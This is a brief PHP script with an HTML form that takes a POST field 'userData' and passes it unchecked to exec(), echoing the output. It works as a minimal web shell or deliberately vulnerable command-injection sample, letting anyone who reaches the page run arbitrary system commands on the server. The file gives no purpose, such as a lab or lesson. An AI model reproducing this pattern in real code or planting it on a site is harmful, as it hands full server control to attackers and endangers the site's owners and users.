<?php

class SystemManager{
  public function toRunOnSystem($userInputData){
    $response = exec($userInputData);
    return $response;
  }
}


if($_SERVER['REQUEST_METHOD'] == 'POST'){
  if(isset($_POST['userData']) && !empty($_POST['userData'])){
    $userInputData = $_POST['userData'];
    $SystemManager = new SystemManager;
    echo $SystemManager->toRunOnSystem($userInputData);
    
  }
}

?>

<form action="" method="post">
  <input type="text" name="userData">
  <input type="submit" value="Send">
</form>
